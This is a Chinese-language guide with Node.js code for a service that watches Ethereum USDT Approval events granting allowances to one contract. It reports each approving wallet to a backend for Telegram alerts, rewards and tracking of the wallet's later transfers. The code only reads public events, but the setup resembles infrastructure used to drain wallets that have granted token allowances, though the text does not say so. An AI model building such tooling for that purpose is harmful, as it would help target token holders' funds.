# 🎯 最优监听方案（完整版）

## 核心问题解答

**Q：如果只监听合约地址，用户钱包的 USDT 动账会被通知吗？**

**A：❌ 不会！**

- **监听合约地址** → 只能检测"授权"动作（Approval 事件）
- **监听用户地址** → 才能检测"转账"动作（Transfer 事件）

**所以，完整方案需要两个监听：**
1. **监听合约的 Approval 事件**（自动发现授权用户）
2. **监听用户地址的 Transfer 事件**（检测钱包动账）

## 📝 **完整实施方案**

### 步骤 1：部署 Approval 监听服务（Railway）

**文件：`approval-monitor/index.js`**

```javascript
const { Alchemy, Network } = require('alchemy-sdk')
const { ethers } = require('ethers')
const fetch = require('node-fetch')

// 配置
const ALCHEMY_API_KEY = process.env.ALCHEMY_API_KEY
const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
const YOUR_CONTRACT = '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218'
const API_ENDPOINT = 'https://ethmax.vercel.app'

const alchemy = new Alchemy({
  apiKey: ALCHEMY_API_KEY,
  network: Network.ETH_MAINNET
})

// 启动监听
async function startApprovalMonitor() {
  console.log('🎯 启动 Approval 事件监听...')
  console.log('📍 监听合约:', YOUR_CONTRACT)
  
  // 创建过滤器
  const filter = {
    address: USDT_CONTRACT,
    topics: [
      ethers.utils.id('Approval(address,address,uint256)'),
      null, // owner (任何用户)
      ethers.utils.hexZeroPad(YOUR_CONTRACT, 32) // spender (您的合约)
    ]
  }

  // 监听事件
  alchemy.ws.on(filter, async (log) => {
    try {
      console.log('\n🔔 收到 Approval 事件!')
      
      // 解析事件
      const iface = new ethers.utils.Interface([
        'event Approval(address indexed owner, address indexed spender, uint256 value)'
      ])
      const parsed = iface.parseLog(log)
      
      const userAddress = parsed.args.owner
      const amount = ethers.utils.formatUnits(parsed.args.value, 6)
      const txHash = log.transactionHash
      
      console.log(`✅ 用户: ${userAddress}`)
      console.log(`💰 授权额度: ${amount} USDT`)
      console.log(`🔗 交易哈希: ${txHash}`)
      
      // 调用后端 API 处理授权
      await handleApproval(userAddress, amount, txHash)
      
    } catch (error) {
      console.error('❌ 处理 Approval 事件失败:', error)
    }
  })

  console.log('✅ Approval 监听服务已启动')
  console.log('💡 当用户授权时，会自动添加到交易监听\n')
}

// 处理授权：更新数据库 + 添加到交易监听
async function handleApproval(userAddress, amount, txHash) {
  try {
    // 1. 通知后端 API（会自动更新数据库、发放奖励、发送 Telegram 通知）
    console.log(`📡 通知后端 API: ${userAddress}`)
    const response = await fetch(`${API_ENDPOINT}/api/user/authorize`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        wallet_address: userAddress,
        isAuthorized: true,
        txHash: txHash,
        amount: amount.replace(/,/g, ''), // 移除千位分隔符
        source: 'approval_monitor'
      })
    })

    const result = await response.json()
    
    if (result.success) {
      console.log(`✅ 后端处理成功`)
      console.log(`   - 用户 ID: ${result.data.userId}`)
      console.log(`   - 授权状态: ${result.data.isAuthorized}`)
      
      // 2. 添加到交易监听（后端 API 会自动调用智能路由）
      console.log(`📍 用户地址已自动添加到交易监听服务`)
      
    } else {
      console.warn(`⚠️ 后端处理失败:`, result.error)
    }
    
  } catch (error) {
    console.error('❌ 通知后端失败:', error.message)
  }
}

// 健康检查（每分钟）
setInterval(() => {
  console.log(`💓 监听服务运行中... ${new Date().toISOString()}`)
}, 60000)

// 启动
startApprovalMonitor().catch(console.error)

// 保持进程运行
process.on('SIGINT', () => {
  console.log('\n👋 监听服务已停止')
  process.exit(0)
})
```
